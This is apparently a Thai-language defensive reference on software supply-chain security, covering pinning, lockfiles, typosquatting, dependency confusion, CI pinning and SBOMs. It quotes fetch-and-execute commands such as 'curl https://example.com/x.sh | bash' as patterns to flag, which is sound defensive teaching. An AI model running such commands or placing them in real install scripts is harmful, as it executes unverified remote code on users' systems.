# Supply Chain Patterns — รายละเอียดต่อ ecosystem

reference สำหรับ skill-cybersecurity-supply-chain · ใช้ประกอบ Phase 1–8 · เนื้อหา defensive เท่านั้น

> หมายเหตุ credential scanner: บรรทัดใดที่มีตัวอย่าง token/secret จะต่อท้ายด้วย `allowlist secret` เพื่อกัน false positive

---

## 1. Pinning — unpinned vs pinned ต่อ ecosystem

| Ecosystem | ❌ unpinned (เสี่ยง) | ✅ pinned (แนะนำ) |
|---|---|---|
| npm | `"lodash": "^4.17.0"`, `"react": "*"`, `"x": "latest"` | `"lodash": "4.17.21"` + commit `package-lock.json` |
| pip | `requests>=2.0`, `flask` (ไม่มี version) | `requests==2.32.0` + `--hash=sha256:...` |
| Go | `require x v1.2.0` ที่ไม่มี `go.sum` | version + entry ใน `go.sum` ครบ |
| Maven | `<version>RELEASE</version>`, `LATEST` | `<version>3.1.4</version>` ตายตัว |
| Composer | `"monolog/monolog": "^2.0"` | `"monolog/monolog": "2.9.3"` + `composer.lock` |
| Gem | `gem "rails"` (ไม่มี version) | `gem "rails", "7.1.3"` + `Gemfile.lock` |
| Cargo | `serde = "1"` | `serde = "=1.0.197"` + `Cargo.lock` |
| NuGet | `Version="*"` | `Version="13.0.3"` + `packages.lock.json` |

หลักการ: operator `^ ~ >= > * x latest RELEASE LATEST` = loose → flag ทุกจุด แล้วเสนอ exact version

---

## 2. Lockfile ของแต่ละภาษา

| Ecosystem | lockfile | มี integrity hash? |
|---|---|---|
| npm | `package-lock.json` | ✅ field `integrity` (sha512) |
| yarn | `yarn.lock` | ✅ |
| pnpm | `pnpm-lock.yaml` | ✅ |
| pip/poetry | `poetry.lock`, `Pipfile.lock` | ✅ `[metadata.files]` / `hashes` |
| Go | `go.sum` | ✅ h1: hashes |
| Gradle | `gradle.lockfile` | บางส่วน |
| Composer | `composer.lock` | ✅ `dist.shasum` |
| RubyGems | `Gemfile.lock` | ⚠️ ไม่มี hash โดย default (ใช้ `BUNDLE_FROZEN`) |
| Cargo | `Cargo.lock` | ✅ checksum |
| NuGet | `packages.lock.json` | ✅ `contentHash` |

ตรวจ: (a) lockfile มีอยู่ (b) committed เข้า git (c) hash field ครบ — ขาดอย่างใด = finding

---

## 3. Install-script fields (จุดรัน arbitrary code ตอนติดตั้ง)

**npm — `package.json`:**
```json
{
  "scripts": {
    "preinstall": "node setup.js",
    "install": "node-gyp rebuild",
    "postinstall": "curl https://example.com/x.sh | bash"
  }
}
```
flag: `preinstall` / `install` / `postinstall` ที่ download+execute หรือเรียก network

**pip — `setup.py`:** โค้ดที่รันตอน build/install เช่น `os.system(...)`, custom `cmdclass`, network call ใน `setup()`
- ปลอดภัยกว่า: ใช้ `pyproject.toml` (PEP 517) แบบ declarative

**build/CI ทุก ecosystem — pattern อันตราย:**
```sh
curl -sL https://example.com/install.sh | bash      # download | execute
wget -qO- http://example.com/x | sh
eval "$(curl https://example.com/env)"
```
remediation: download → verify checksum/signature → ค่อยรัน

---

## 4. Typosquatting + Dependency Confusion

**Typosquatting** — ชื่อคล้ายของดังแบบผิดนิดเดียว:
- `reqeusts` (vs `requests`) · `loadsh`/`lodahs` (vs `lodash`) · `expresss` (vs `express`)
- `python-dateutil` ↔ `python3-dateutil` · `urllib` ↔ `urllib3`
- indicator: edit-distance ใกล้ชื่อยอดนิยม, ชื่อสลับ scope, hyphen/underscore สลับ

**Dependency confusion** — internal package ชื่อชนกับ public registry:
```json
// ❌ internal package ไม่ pin registry — npm อาจไปดึงจาก public ที่ชื่อชนกัน
{ "dependencies": { "@kob/internal-utils": "^1.0.0" } }
```
remediation: pin private registry ผ่าน `.npmrc` scope mapping
```ini
@kob:registry=https://registry.internal.kob/
//registry.internal.kob/:_authToken=REDACTED_TOKEN   # allowlist secret
```
- pip: ใช้ `--index-url` เดียว + `--no-index` หรือ private index เท่านั้น (ระวัง `--extra-index-url` ที่เปิดช่อง confusion)
- ตรวจว่า internal scope/namespace มีอยู่จริงบน public registry หรือไม่ (squat risk)

---

## 5. CVE-prone packages ที่พบบ่อย (ตัวอย่าง — ต้องยืนยันด้วย advisory DB เสมอ)

| Package | ecosystem | บริบทที่ควรเช็คเป็นพิเศษ |
|---|---|---|
| `lodash` < 4.17.21 | npm | prototype pollution |
| `log4j-core` 2.0–2.14 | maven | Log4Shell (RCE) |
| `event-stream` 3.3.6 | npm | เคยถูกฝัง malware (compromised maintainer) |
| `requests`/`urllib3` เก่า | pip | TLS/redirect issues |
| `minimist` < 1.2.6 | npm | prototype pollution |
| `pyyaml` < 5.4 (`yaml.load`) | pip | unsafe deserialization |
| `xstream`/`fastjson` เก่า | maven | deserialization RCE |

> รายการนี้เป็น starting point ไม่ใช่ทั้งหมด — เทียบ version จริงกับ advisory (GHSA/OSV/NVD) แล้ว mark `ยืนยันแล้ว` หรือ `ต้องยืนยัน`

---

## 6. CI/CD pinning (Phase 7)

**GitHub Actions — pin ด้วย SHA ไม่ใช่ tag:**
```yaml
# ❌ tag = mutable — เจ้าของ retag ได้
- uses: actions/checkout@v4
# ✅ pin commit SHA (immutable) + comment บอก version
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
```

**Dockerfile — pin digest:**
```dockerfile
# ❌ FROM node:20
# ✅ FROM node:20@sha256:abcd...   ไม่ใช้ :latest
```
flag เพิ่ม: secrets ที่ส่งให้ third-party action, action จาก repo ที่ไม่ verify, `pull_request_target` + checkout PR code

---

## 7. วิธีอ่าน SBOM

SBOM = รายการ component ทั้งหมดของซอฟต์แวร์ มาตรฐานหลัก:
- **CycloneDX** (`bom.json`/`bom.xml`) — `components[].{name,version,purl,hashes,licenses}`
- **SPDX** (`*.spdx.json`) — `packages[].{name,versionInfo,downloadLocation,checksums}`

**purl (package URL)** ใช้ระบุ component ข้าม ecosystem:
```
pkg:npm/lodash@4.17.21
pkg:pypi/requests@2.32.0
pkg:golang/github.com/gin-gonic/gin@v1.9.1
```

อ่าน SBOM เพื่อ: (a) cross-check กับ lockfile ว่าตรงกัน (b) หา component ที่ไม่มี hash/license (c) ป้อนเข้า CVE matching

**เทมเพลต SBOM ใน report:**
| name | version | ecosystem | direct/transitive | hash | license |
|---|---|---|---|---|---|
| lodash | 4.17.21 | npm | direct | ✅ | MIT |
| (transitive deps...) | | | transitive | | |
